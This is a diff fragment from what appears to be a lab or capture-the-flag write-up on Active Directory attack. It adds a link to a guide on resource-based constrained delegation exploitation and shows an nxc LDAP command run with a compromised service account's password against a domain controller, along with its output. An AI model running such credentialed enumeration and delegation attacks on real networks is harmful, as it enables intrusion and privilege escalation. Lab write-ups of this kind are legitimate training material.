@@ -659,6 +659,8 @@ This user is now compromised, so now ill look at abusing RBCD
 
 https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd
 
+https://medium.com/@offsecdeer/a-practical-guide-to-rbcd-exploitation-a3f1a47267d5
+
 ```python
 nxc ldap dc.phantom.vl -u svc_sspr -p 'gB6XTcqVP5MlP7Rc' -M maq
 LDAP        10.129.234.63   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:phantom.vl) (signing:None) (channel binding:No TLS cert) 
